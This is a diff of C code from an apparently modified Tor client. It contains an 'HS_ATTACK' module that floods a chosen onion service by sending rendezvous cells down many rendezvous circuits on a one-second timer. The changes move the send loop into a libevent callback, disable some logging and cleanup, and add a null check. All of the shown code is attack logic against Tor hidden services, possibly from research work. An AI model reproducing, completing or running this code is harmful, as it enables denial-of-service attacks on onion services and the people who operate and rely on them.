@@ -391,8 +391,8 @@ static void hs_attack_send_cb(evutil_socket_t fd, short events, void *args) {
     circmaps_sl_len = smartlist_len(attack_infos->rendcircs);
     for (circmaps_sl_idx = 0; circmaps_sl_idx < circmaps_sl_len; circmaps_sl_idx++) {
       circmap = (circ_info_t *) smartlist_get(attack_infos->rendcircs, circmaps_sl_idx);
-      log_info(LD_REND, "HS_ATTACK: Trying to send rd cell down circ %s\n",
-          circuit_list_path(circmap->rendcirc, 0));
+      /*log_info(LD_REND, "HS_ATTACK: Trying to send rd cell down circ %s\n",*/
+          /*circuit_list_path(circmap->rendcirc, 0));*/
       if (!circmap)
         continue;
       if (!circmap->do_not_touch && circmap->state_rend == REND_CIRC_READY_FOR_RD) {
@@ -405,9 +405,6 @@ static void hs_attack_send_cb(evutil_socket_t fd, short events, void *args) {
         }
       }
     }
-    /*if (HS_ATTACK_TESTING)*/
-      /*return;*/
-
     struct timeval timeout = {1, 0};
     evtimer_add(attack_infos->ev, &timeout);
   }
@@ -422,58 +419,17 @@ static void hs_attack_launch(void *until_launch) {
   /*log_debug(LD_REND, "HS_ATTACK: number of cells sent per second: %d", num_cells);*/
   int cell_per_circuit = (int) num_cells / smartlist_len(attack_infos->rendcircs);
   attack_infos->stats->cells_per_circuit = cell_per_circuit;
-  if (HS_ATTACK_TESTING) {
     /*Just send 1 rd through each rendezvous circ*/
 
-    struct timeval timeout = {1, 0}; //1 second
-    struct event *ev;
-    ev = tor_evtimer_new(tor_libevent_get_base(), hs_attack_send_cb, NULL);
-    attack_infos->ev = ev;
-    evtimer_add(ev, &timeout);
-    return;
-    // -------------------
-    time_t now = time(NULL);
-    struct timeval tv, tv_then;
-    int circmaps_sl_idx, circmaps_sl_len;
-    circ_info_t *circmap;
-    while (*attack_infos->until > now) {
-      tor_gettimeofday(&tv);
-      /*LOCK_CIRCUIT();*/
-      /*LOCK_ATTACK();*/
-      circmaps_sl_len = smartlist_len(attack_infos->rendcircs);
-      for (circmaps_sl_idx = 0; circmaps_sl_idx < circmaps_sl_len; circmaps_sl_idx++) {
-        circmap = (circ_info_t *) smartlist_get(attack_infos->rendcircs, circmaps_sl_idx);
-        //log_info(LD_REND, "HS_ATTACK: Trying to send rd cell down circ %s\n",
-        //    circuit_list_path(circmap->rendcirc, 0));
-        if (!circmap)
-          continue;
-        if (!circmap->do_not_touch && circmap->state_rend == REND_CIRC_READY_FOR_RD) {
-          for (int j = 0; j <  cell_per_circuit; j++) {
-            if (send_rd_cell(circmap->rendcirc) < 0) {
-              circmap->do_not_touch = 1;
-              break;
-            }
-            attack_infos->stats->tot_cells++;
-          }
-        }
-      }
-      /*UNLOCK_ATTACK();*/
-      /*UNLOCK_CIRCUIT();*/
-      tor_gettimeofday(&tv_then);
-      if ( 1000000 * tv_then.tv_sec + tv_then.tv_usec - 1000000*tv.tv_sec - tv.tv_usec  < 1000000) {
-        usleep(1000000-(1000000*tv_then.tv_sec + tv_then.tv_usec - 1000000*tv.tv_sec - tv.tv_usec));
-      }
-      /*if (tot_cell_count % 10 == 0)*/
-        /*log_info(LD_REND, "HS_ATTACK: launched %u cells", tot_cell_count);*/
-      /*if (tot_cell_count % 1000 == 0)*/
-        /*spawn_exit();*/
-      now = time(NULL);
-    }
-  }
+  struct timeval timeout = {1, 0}; //1 second
+  struct event *ev;
+  ev = tor_evtimer_new(tor_libevent_get_base(), hs_attack_send_cb, NULL);
+  attack_infos->ev = ev;
+  evtimer_add(ev, &timeout);
 }
 
 void hs_attack_mark_for_close_cb(circuit_t *circ, int reason) {
-  if (!CIRCUIT_IS_ORIGIN(circ))
+  if (!CIRCUIT_IS_ORIGIN(circ) || !attack_infos)
     return;
   /*LOCK_CIRCUIT();*/
   /*LOCK_ATTACK();*/
@@ -646,7 +602,6 @@ hs_attack_entry_point(hs_attack_cmd_t cmd, const char *onionaddress,
     //attack_infos->rend_data = NULL;
     //attack_infos->extend_info = (extend_info_t *) tor_malloc(sizeof(extend_info_t));
     attack_infos->state = INITIALIZED;
-    tor_mutex_init_nonrecursive(&attack_infos->stats->attack_mutex);
     control_event_hs_attack(HS_ATTACK_MONITOR_HEALTHINESS);
   }
   switch(cmd) {
@@ -668,8 +623,8 @@ hs_attack_entry_point(hs_attack_cmd_t cmd, const char *onionaddress,
 
       hs_attack_launch(until);
 
-      if (!HS_ATTACK_TESTING)
-        free_hs_rd_attack();
+      /*if (!HS_ATTACK_TESTING)*/
+        /*free_hs_rd_attack();*/
       break;
     case CHECK_HEALTHINESS:
       //LOCK_ATTACK();
